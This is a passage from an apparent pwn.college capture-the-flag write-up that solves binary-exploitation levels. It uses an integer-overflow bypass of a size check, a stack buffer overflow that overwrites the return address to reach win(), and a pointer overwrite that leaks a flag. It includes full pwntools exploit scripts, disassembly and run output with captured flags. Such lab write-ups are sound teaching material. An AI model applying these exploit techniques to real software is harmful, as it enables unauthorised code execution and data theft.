| 0x00007ffc78442740 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442748 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442750 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442758 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442760 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442768 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442770 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442778 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442780 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442788 (rsp+0x0088) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc78442790 (rsp+0x0090) | 00 00 40 00 00 00 00 00 | 0x0000000000400000 |
| 0x00007ffc78442798 (rsp+0x0098) | 50 2b 40 00 00 00 00 00 | 0x0000000000402b50 |
| 0x00007ffc784427a0 (rsp+0x00a0) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffc784427a8 (rsp+0x00a8) | 30 27 44 78 fc 7f 00 00 | 0x00007ffc78442730 |
| 0x00007ffc784427b0 (rsp+0x00b0) | e0 37 44 78 fc 7f 00 00 | 0x00007ffc784437e0 |
| 0x00007ffc784427b8 (rsp+0x00b8) | 32 2b 40 00 00 00 00 00 | 0x0000000000402b32 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffc78442700, and our base pointer points to 0x7ffc784427b0.
This means that we have (decimal) 24 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 192 bytes.
The input buffer begins at 0x7ffc78442730, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 98 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

In this level, there is no "win" variable.
You will need to force the program to execute the win() function
by directly overflowing into the stored return address back to main,
which is stored at 0x7ffc784427b8, 136 bytes after the start of your input buffer.
That means that you will need to input at least 144 bytes (98 to fill the buffer,
38 to fill other stuff stored between the buffer and the return address,
and 8 that will overwrite the return address).

We have disabled the following standard memory corruption mitigations for this challenge:
- the canary is disabled, otherwise you would corrupt it before
overwriting the return address, and the program would abort.
- the binary is *not* position independent. This means that it will be
located at the same spot every time it is run, which means that by
analyzing the binary (using objdump or reading this output), you can
know the exact value that you need to overwrite the return address with.

This challenge will let you send multiple payload records concatenated together.
It will make sure that the total payload size fits in the allocated buffer
on the stack. Can you send a carefully crafted input to break this calculation?
Number of payload records to send: 100
Size of each payload record: 100
casting-catastrophe-easy: /challenge/babymem-level-5-0.c:147: challenge: Assertion `record_size * record_num <= 98' failed.
Aborted
```

This program accepts the `record_size` and `record_num` from the user, and if the multiplication result is greater that `98` which is the buffer size, it exits.

Let's see how this check is performed.

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# --- snip ---

   0x00000000004026e4 <+774>:   lea    rax,[rbp-0x84]
   0x00000000004026eb <+781>:   mov    rsi,rax
   0x00000000004026ee <+784>:   lea    rdi,[rip+0x12cf]        # 0x4039c4
   0x00000000004026f5 <+791>:   mov    eax,0x0
   0x00000000004026fa <+796>:   call   0x4011a0 <__isoc99_scanf@plt>

# --- snip ---

   0x0000000000402739 <+859>:   lea    rax,[rbp-0x88]
   0x0000000000402740 <+866>:   mov    rsi,rax
   0x0000000000402743 <+869>:   lea    rdi,[rip+0x127a]        # 0x4039c4
   0x000000000040274a <+876>:   mov    eax,0x0
   0x000000000040274f <+881>:   call   0x4011a0 <__isoc99_scanf@plt>

# --- snip ---

   0x000000000040277d <+927>:   mov    edx,DWORD PTR [rbp-0x88]
   0x0000000000402783 <+933>:   mov    eax,DWORD PTR [rbp-0x84]
   0x0000000000402789 <+939>:   imul   eax,edx
   0x000000000040278c <+942>:   cmp    eax,0x62
   0x000000000040278f <+945>:   jbe    0x4027b0 <challenge+978>
   0x0000000000402791 <+947>:   lea    rcx,[rip+0x1868]        # 0x404000 <__PRETTY_FUNCTION__.5728>
   0x0000000000402798 <+954>:   mov    edx,0x93
   0x000000000040279d <+959>:   lea    rsi,[rip+0x1224]        # 0x4039c8
   0x00000000004027a4 <+966>:   lea    rdi,[rip+0x127d]        # 0x403a28
   0x00000000004027ab <+973>:   call   0x401150 <__assert_fail@plt>
   0x00000000004027b0 <+978>:   mov    eax,DWORD PTR [rbp-0x84]

# --- snip ---

End of assembler dump.
```

If we look at the disassembly, we can see the variables, `record_num` and `record_size` are stored at the 4 bytes pointed to by `rbp-0x84` and `rbp-0x88` respectively.
Later, these values are moved into `edx` and `eax`, which are used with a `mul` instruction.
The result of the `mul` instruction, which is stored in `eax`, is compared with `0x62` using the `jbe` instruction. 

Since the progam is using `jbe`, which interprets the numbers as unsigned integers, we cannot pull the [same trick from the last challenge](#bounds-breaker-easy).
Moving ahead, if the result of the multiplication greater than `0x62`, the program exits.

However, the vulnerability here is an [Integer Overflow](https://en.wikipedia.org/wiki/Integer_overflow). The instruction `imul eax, edx` performs 32-bit multiplication. If the result is larger than what 32 bits can hold, the "extra" bits are simply discarded (truncated), and only the lower 32 bits remain in `eax` for the `cmp` instruction.

### Integer overflow

We need to provide two numbers whose mathematical product is very large, but when truncated to 32 bits, the result is between `0` and `0x62` (98 in decimal).

<!-- To find these numbers, we look for a product that equals:

$$(2^{32} \cdot n) + \text{remainder}$$

Where $n$ is any integer (usually 1 is easiest) and $\text{remainder} \le 98$.

Possible value:
- 65536 ($n = 1$, $\text{remainder} = 0$)

When 65536 is multiplied with 65536, the result is $4,294,967,296$, whose hexadecimal representation is as follows:

```
64:         32:
0x100000000 0x00000000
```

As we can see, even if the result is a huge number ($4,294,967,296$), the value within `eax` is $0$. -->

Before we craft our exploit, we need the address of `win()`.

### `win()`

```
pwndbg> info address win
Symbol "win" is at 0x4022d7 in a file compiled without debugging.
```

### Exploit.

```py title="~/script.py" showLineNumber
from pwn import *

p = process('/challenge/casting-catastrophe-easy')

# Initialize values
buffer_addr = 0x7ffcf11c6c80
addr_of_stored_ip = 0x7ffcf11c6d08
win_func_addr = 0x4022d7

# Calculate offset & payload_size
offset = addr_of_stored_ip - buffer_addr
records_num = 65536
records_size = 65536

# Build payload
payload = b"A" * offset
payload += p64(win_func_addr)

# Send number of records
p.recvuntil(b'Number of payload records to send: ')
p.sendline(str(records_num))

# Send size of records
p.recvuntil(b'Size of each payload record: ')
p.sendline(str(records_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~casting-catastrophe-easy:~$ python ~/script.py 
[+] Starting local process '/challenge/casting-catastrophe-easy': pid 1314
/home/hacker/script.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(records_num))
/home/hacker/script.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(records_size))
[*] Switching to interactive mode
 (up to 4294967296 bytes)!
[*] Process '/challenge/casting-catastrophe-easy' stopped with exit code -11 (SIGSEGV) (pid 1314)
You sent 144 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffd9b661830 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffd9b661838 (rsp+0x0008) | 18 2a 66 9b fd 7f 00 00 | 0x00007ffd9b662a18 |
| 0x00007ffd9b661840 (rsp+0x0010) | 08 2a 66 9b fd 7f 00 00 | 0x00007ffd9b662a08 |
| 0x00007ffd9b661848 (rsp+0x0018) | 23 d7 e0 b0 01 00 00 00 | 0x00000001b0e0d723 |
| 0x00007ffd9b661850 (rsp+0x0020) | 68 0d 00 00 00 00 00 00 | 0x0000000000000d68 |
| 0x00007ffd9b661858 (rsp+0x0028) | 00 00 01 00 00 00 01 00 | 0x0001000000010000 |
| 0x00007ffd9b661860 (rsp+0x0030) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661868 (rsp+0x0038) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661870 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661878 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661880 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661888 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661890 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b661898 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618a0 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618a8 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618b0 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618b8 (rsp+0x0088) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618c0 (rsp+0x0090) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618c8 (rsp+0x0098) | 41 41 41 41 90 00 00 00 | 0x0000009041414141 |
| 0x00007ffd9b6618d0 (rsp+0x00a0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618d8 (rsp+0x00a8) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618e0 (rsp+0x00b0) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007ffd9b6618e8 (rsp+0x00b8) | d7 22 40 00 00 00 00 00 | 0x00000000004022d7 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x4141414141414141
- the saved frame pointer (of main) is at 0x7ffd9b6618e0
- the saved return address (previously to main) is at 0x7ffd9b6618e8
- the saved return address is now pointing to 0x4022d7.
- the address of win() is 0x4022d7.

If you have managed to overwrite the return address with the correct value,
challenge() will jump straight to win() when it returns.
Let's try it now!

Goodbye!
You win! Here is your flag:
pwn.college{AHvK09p2sS2HAcH9C1wLClyOklX.01N5IDL4ITM0EzW}


[*] Got EOF while reading in interactive
$  
```

&nbsp;

## Casting Catastrophe (Hard)

```
hacker@program-security~casting-catastrophe-hard:~$ /challenge/casting-catastrophe-hard 
###
### Welcome to /challenge/casting-catastrophe-hard!
###

Number of payload records to send: 2
Size of each payload record: 2
Send your payload (up to 4 bytes)!
aaaa
Goodbye!
### Goodbye!
```

* [ ] Location of buffer
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

### `challenge()`

```
pwndbg> disassemble challenge
Dump of assembler code for function challenge:

# --- snip ---

   0x0000000000401653 <+99>:    lea    rax,[rbp-0x44]
   0x0000000000401657 <+103>:   mov    rsi,rax
   0x000000000040165a <+106>:   lea    rdi,[rip+0xad3]        # 0x402134
   0x0000000000401661 <+113>:   mov    eax,0x0
   0x0000000000401666 <+118>:   call   0x4011a0 <__isoc99_scanf@plt>

# --- snip ---

   0x00000000004016a2 <+178>:   lea    rax,[rbp-0x48]
   0x00000000004016a6 <+182>:   mov    rsi,rax
   0x00000000004016a9 <+185>:   lea    rdi,[rip+0xa84]        # 0x402134
   0x00000000004016b0 <+192>:   mov    eax,0x0
   0x00000000004016b5 <+197>:   call   0x4011a0 <__isoc99_scanf@plt>

# --- snip ---

   0x00000000004016e0 <+240>:   mov    edx,DWORD PTR [rbp-0x48]
   0x00000000004016e3 <+243>:   mov    eax,DWORD PTR [rbp-0x44]
   0x00000000004016e6 <+246>:   imul   eax,edx
   0x00000000004016e9 <+249>:   cmp    eax,0x25
   0x00000000004016ec <+252>:   jbe    0x40170d <challenge+285>
   0x00000000004016ee <+254>:   lea    rcx,[rip+0xb43]        # 0x402238 <__PRETTY_FUNCTION__.5714>
   0x00000000004016f5 <+261>:   mov    edx,0x4d
   0x00000000004016fa <+266>:   lea    rsi,[rip+0xa37]        # 0x402138
   0x0000000000401701 <+273>:   lea    rdi,[rip+0xa90]        # 0x402198
   0x0000000000401708 <+280>:   call   0x401150 <__assert_fail@plt>
   0x000000000040170d <+285>:   mov    eax,DWORD PTR [rbp-0x44]

# --- snip ---

End of assembler dump.
```

This challenge makes the same mistake of multiplying two 32-bit registers, and the comparing only the part of the result stored in `eax`.

* [ ] Location of buffer
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

Let's set a breakpoit right before the call to `read@plt`.

```
# --- snip ---

   0x000000000040173f <+335>:   mov    rdx,QWORD PTR [rbp-0x10]
   0x0000000000401743 <+339>:   mov    rax,QWORD PTR [rbp-0x8]
   0x0000000000401747 <+343>:   mov    rsi,rax
   0x000000000040174a <+346>:   mov    edi,0x0
   0x000000000040174f <+351>:   call   0x401170 <read@plt>

# --- snip ---
```

```
pwndbg> break *(challenge+351)
Breakpoint 1 at 0x40174f
```

Now let's run the program.

```
pwndbg> run
Starting program: /challenge/casting-catastrophe-hard 
###
### Welcome to /challenge/casting-catastrophe-hard!
###

Number of payload records to send: 2
Size of each payload record: 2
Send your payload (up to 4 bytes)!

Breakpoint 1, 0x000000000040174f in challenge ()
LEGEND: STACK | HEAP | CODE | DATA | WX | RODATA
────────────────────────────────────────────────────────────────[ REGISTERS / show-flags off / show-compact-regs off ]─────────────────────────────────────────────────────────────────
 RAX  0x7ffec1695f10 ◂— 0
 RBX  0x401880 (__libc_csu_init) ◂— endbr64 
 RCX  0
 RDX  4
 RDI  0
 RSI  0x7ffec1695f10 ◂— 0
 R8   0x23
 R9   0x23
 R10  0x4021d4 ◂— ' bytes)!\n'
 R11  0x246
 R12  0x4011d0 (_start) ◂— endbr64 
 R13  0x7ffec1697070 ◂— 1
 R14  0
 R15  0
 RBP  0x7ffec1695f50 —▸ 0x7ffec1696f80 ◂— 0
 RSP  0x7ffec1695ee0 —▸ 0x7318053626a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
 RIP  0x40174f (challenge+351) ◂— call read@plt
─────────────────────────────────────────────────────────────────────────[ DISASM / x86-64 / set emulate on ]──────────────────────────────────────────────────────────────────────────
 ► 0x40174f <challenge+351>    call   read@plt                    <read@plt>
        fd: 0 (/dev/pts/0)
        buf: 0x7ffec1695f10 ◂— 0
        nbytes: 4
 
   0x401754 <challenge+356>    mov    dword ptr [rbp - 0x14], eax
   0x401757 <challenge+359>    cmp    dword ptr [rbp - 0x14], 0
   0x40175b <challenge+363>    jns    challenge+409               <challenge+409>
 
   0x40175d <challenge+365>    call   __errno_location@plt        <__errno_location@plt>
 
   0x401762 <challenge+370>    mov    eax, dword ptr [rax]
   0x401764 <challenge+372>    mov    edi, eax
   0x401766 <challenge+374>    call   strerror@plt                <strerror@plt>
 
   0x40176b <challenge+379>    mov    rsi, rax
   0x40176e <challenge+382>    lea    rdi, [rip + 0xa6b]     RDI => 0x4021e0 ◂— 'ERROR: Failed to read input -- %s!\n'
   0x401775 <challenge+389>    mov    eax, 0                 EAX => 0
───────────────────────────────────────────────────────────────────────────────────────[ STACK ]───────────────────────────────────────────────────────────────────────────────────────
00:0000│ rsp     0x7ffec1695ee0 —▸ 0x7318053626a0 (_IO_2_1_stdout_) ◂— 0xfbad2887
01:0008│-068     0x7ffec1695ee8 —▸ 0x7ffec1697088 —▸ 0x7ffec1697681 ◂— 'SHELL=/run/dojo/bin/bash'
02:0010│-060     0x7ffec1695ef0 —▸ 0x7ffec1697078 —▸ 0x7ffec169765d ◂— '/challenge/casting-catastrophe-hard'
03:0018│-058     0x7ffec1695ef8 ◂— 0x100000000
04:0020│-050     0x7ffec1695f00 ◂— 0
05:0028│-048     0x7ffec1695f08 ◂— 0x200000002
06:0030│ rax rsi 0x7ffec1695f10 ◂— 0
07:0038│-038     0x7ffec1695f18 ◂— 0
─────────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────────────────────────────────────────────────────
 ► 0         0x40174f challenge+351
   1         0x401862 main+198
   2   0x731805199083 __libc_start_main+243
   3         0x4011fe _start+46
───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
```

* [x] Location of buffer: `0x7ffec1695f10`
* [ ] Location of stored return address to `main()`
* [ ] Location of `win()`

```
pwndbg> info frame
Stack level 0, frame at 0x7ffec1695f60:
 rip = 0x40174f in challenge; saved rip = 0x401862
 called by frame at 0x7ffec1696f90
 Arglist at 0x7ffec1695f50, args: 
 Locals at 0x7ffec1695f50, Previous frame's sp is 0x7ffec1695f60
 Saved registers:
  rbp at 0x7ffec1695f50, rip at 0x7ffec1695f58
```

* [x] Location of buffer: `0x7ffec1695f10`
* [x] Location of stored return address to `main()`: `0x7ffec1695f58`
* [ ] Location of `win()`

```
pwndbg> info address win
Symbol "win" is at 0x4014e9 in a file compiled without debugging.
```

* [x] Location of buffer: `0x7ffec1695f10`
* [x] Location of stored return address to `main()`: `0x7ffec1695f58`
* [x] Location of `win()`: `0x4014e9`

### Exploit

```py title="~/script.py" showLineNumbers
from pwn import *

p = process('/challenge/casting-catastrophe-hard')

# Initialize values
buffer_addr = 0x7ffec1695f10
addr_of_stored_ip = 0x7ffec1695f58
win_func_addr = 0x4014e9

# Calculate offset & payload_size
offset = addr_of_stored_ip - buffer_addr
records_num = 65536
records_size = 65536

# Build payload
payload = b"A" * offset
payload += p64(win_func_addr)

# Send number of records
p.recvuntil(b'Number of payload records to send: ')
p.sendline(str(records_num))

# Send size of records
p.recvuntil(b'Size of each payload record: ')
p.sendline(str(records_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~casting-catastrophe-hard:~$ python ~/script.py 
[+] Starting local process '/challenge/casting-catastrophe-hard': pid 5355
/home/hacker/script.py:21: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(records_num))
/home/hacker/script.py:25: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(records_size))
[*] Switching to interactive mode
 (up to 4294967296 bytes)!
[*] Process '/challenge/casting-catastrophe-hard' stopped with exit code -11 (SIGSEGV) (pid 5355)
Goodbye!
You win! Here is your flag:
pwn.college{IJd8sr_N9kk7rRD9zwIz4XoDVHP.0FO5IDL4ITM0EzW}


[*] Got EOF while reading in interactive
$ 
```

&nbsp;

## Pointer Problems (Easy)

> Leverage memory corruption to leak the flag.

```
hacker@program-security~pointer-problems-easy:~$ /challenge/pointer-problems-easy 
In this level, the flag will be loaded into the bss section of memory.
However, at no point will this program actually print the buffer storing the flag.
Reading flag into memory...
The challenge() function has just been launched!
Before we do anything, let's take a look at challenge()'s stack frame:
+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe3b8a8580 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffe3b8a8588 (rsp+0x0008) | 68 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9768 |
| 0x00007ffe3b8a8590 (rsp+0x0010) | 58 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9758 |
| 0x00007ffe3b8a8598 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffe3b8a85a0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85a8 (rsp+0x0028) | a0 16 ef 0c 51 70 00 00 | 0x000070510cef16a0 |
| 0x00007ffe3b8a85b0 (rsp+0x0030) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85b8 (rsp+0x0038) | 60 40 99 09 2f 5f 00 00 | 0x00005f2f09994060 |
| 0x00007ffe3b8a85c0 (rsp+0x0040) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85c8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85d0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85d8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85e0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85e8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85f0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85f8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a8600 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a8608 (rsp+0x0088) | 9b 41 99 09 2f 5f 00 00 | 0x00005f2f0999419b |
| 0x00007ffe3b8a8610 (rsp+0x0090) | a0 11 99 09 2f 5f 00 00 | 0x00005f2f099911a0 |
| 0x00007ffe3b8a8618 (rsp+0x0098) | 00 5e 42 2f 40 62 a6 5c | 0x5ca662402f425e00 |
| 0x00007ffe3b8a8620 (rsp+0x00a0) | 60 96 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9660 |
| 0x00007ffe3b8a8628 (rsp+0x00a8) | d7 1b 99 09 2f 5f 00 00 | 0x00005f2f09991bd7 |
+---------------------------------+-------------------------+--------------------+
Our stack pointer points to 0x7ffe3b8a8580, and our base pointer points to 0x7ffe3b8a8620.
This means that we have (decimal) 22 8-byte words in our stack frame,
including the saved base pointer and the saved return address, for a
total of 176 bytes.
The input buffer begins at 0x7ffe3b8a85c0, partway through the stack frame,
("above" it in the stack are other local variables used by the function).
Your input will be read into this buffer.
The buffer is 65 bytes long, but the program will let you provide an arbitrarily
large input length, and thus overflow the buffer.

This challenge has a char* on the stack that will be printed after parsing your input.
The char* is located at 0x7ffe3b8a8608, 72 bytes after the start of your input buffer.
The flag  is located at 0x5f2f09994060.

Pay close attention to how these values relate now, because they will change every time you run the program due to ASLR!

Payload size: 2
Send your payload (up to 2 bytes)!
aa
You sent 2 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007ffe3b8a8580 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007ffe3b8a8588 (rsp+0x0008) | 68 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9768 |
| 0x00007ffe3b8a8590 (rsp+0x0010) | 58 97 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9758 |
| 0x00007ffe3b8a8598 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007ffe3b8a85a0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85a8 (rsp+0x0028) | a0 16 ef 0c 02 00 00 00 | 0x000000020cef16a0 |
| 0x00007ffe3b8a85b0 (rsp+0x0030) | 02 00 00 00 00 00 00 00 | 0x0000000000000002 |
| 0x00007ffe3b8a85b8 (rsp+0x0038) | 60 40 99 09 2f 5f 00 00 | 0x00005f2f09994060 |
| 0x00007ffe3b8a85c0 (rsp+0x0040) | 61 61 00 00 00 00 00 00 | 0x0000000000006161 |
| 0x00007ffe3b8a85c8 (rsp+0x0048) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85d0 (rsp+0x0050) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85d8 (rsp+0x0058) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85e0 (rsp+0x0060) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85e8 (rsp+0x0068) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85f0 (rsp+0x0070) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a85f8 (rsp+0x0078) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a8600 (rsp+0x0080) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007ffe3b8a8608 (rsp+0x0088) | 9b 41 99 09 2f 5f 00 00 | 0x00005f2f0999419b |
| 0x00007ffe3b8a8610 (rsp+0x0090) | a0 11 99 09 2f 5f 00 00 | 0x00005f2f099911a0 |
| 0x00007ffe3b8a8618 (rsp+0x0098) | 00 5e 42 2f 40 62 a6 5c | 0x5ca662402f425e00 |
| 0x00007ffe3b8a8620 (rsp+0x00a0) | 60 96 8a 3b fe 7f 00 00 | 0x00007ffe3b8a9660 |
| 0x00007ffe3b8a8628 (rsp+0x00a8) | d7 1b 99 09 2f 5f 00 00 | 0x00005f2f09991bd7 |
+---------------------------------+-------------------------+--------------------+
The program's memory status:
- the input buffer starts at 0x7ffe3b8a85c0

Calling printf() to printf with the pointer...
The string on the stack is: This is a string in the bss!
Goodbye!
```

This challenge prints whatever string is pointed to by the `char*` pointer.
So in order to solve this challenge, we just need to overflow the buffer, and overwrite the `char*` pointer with the address of the flag.

```py title="~/script.py" showLineNumbers
from pwn import *
import re

p = process('/challenge/pointer-problems-easy')

output = p.recvuntil(b'Payload size:')

# input buffer base
buffer_addr = int(re.search(rb'input buffer begins at (0x[0-9a-fA-F]+)', output).group(1), 16)
# the target char* pointer on stack
char_ptr_addr = int(re.search(rb'The char\* is located at (0x[0-9a-fA-F]+)', output).group(1), 16)
# the flag's address in the bss
flag_addr = int(re.search(rb'The flag\s+is located at (0x[0-9a-fA-F]+)', output).group(1), 16)

# Calculate offset & payload_size
offset = char_ptr_addr - buffer_addr
payload_size = offset + 8

# Log info
log.success(f"Input Buffer     @ {hex(buffer_addr)}")
log.success(f"Pointer          @ {hex(char_ptr_addr)}")
log.success(f"Flag Addr        @ {hex(flag_addr)}")
log.success(f"Offset:            {offset} bytes")

# Build payload
payload = b"A" * offset
payload += p64(flag_addr)

# Send payload size (this is what's actually asked for now)
p.sendline(str(payload_size))

# Send payload
p.recvuntil(b'Send your payload')
p.send(payload)

p.interactive() 
```

```
hacker@program-security~pointer-problems-easy:~$ python ~/script.py 
[+] Starting local process '/challenge/pointer-problems-easy': pid 10061
[+] Input Buffer     @ 0x7fff3881eef0
[+] Pointer          @ 0x7fff3881ef38
[+] Flag Addr        @ 0x60eb05b09060
[+] Offset:        72 bytes
/home/hacker/script.py:30: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  p.sendline(str(payload_size))
[*] Switching to interactive mode
 (up to 80 bytes)!
[*] Process '/challenge/pointer-problems-easy' stopped with exit code 0 (pid 10061)
You sent 80 bytes!
Let's see what happened with the stack:

+---------------------------------+-------------------------+--------------------+
|                  Stack location |            Data (bytes) |      Data (LE int) |
+---------------------------------+-------------------------+--------------------+
| 0x00007fff3881eeb0 (rsp+0x0000) | 1c 00 00 00 00 00 00 00 | 0x000000000000001c |
| 0x00007fff3881eeb8 (rsp+0x0008) | 98 00 82 38 ff 7f 00 00 | 0x00007fff38820098 |
| 0x00007fff3881eec0 (rsp+0x0010) | 88 00 82 38 ff 7f 00 00 | 0x00007fff38820088 |
| 0x00007fff3881eec8 (rsp+0x0018) | 00 00 00 00 01 00 00 00 | 0x0000000100000000 |
| 0x00007fff3881eed0 (rsp+0x0020) | 00 00 00 00 00 00 00 00 | 0x0000000000000000 |
| 0x00007fff3881eed8 (rsp+0x0028) | a0 26 8b 28 50 00 00 00 | 0x00000050288b26a0 |
| 0x00007fff3881eee0 (rsp+0x0030) | 50 00 00 00 00 00 00 00 | 0x0000000000000050 |
| 0x00007fff3881eee8 (rsp+0x0038) | 60 90 b0 05 eb 60 00 00 | 0x000060eb05b09060 |
| 0x00007fff3881eef0 (rsp+0x0040) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881eef8 (rsp+0x0048) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef00 (rsp+0x0050) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef08 (rsp+0x0058) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef10 (rsp+0x0060) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef18 (rsp+0x0068) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef20 (rsp+0x0070) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef28 (rsp+0x0078) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
| 0x00007fff3881ef30 (rsp+0x0080) | 41 41 41 41 41 41 41 41 | 0x4141414141414141 |
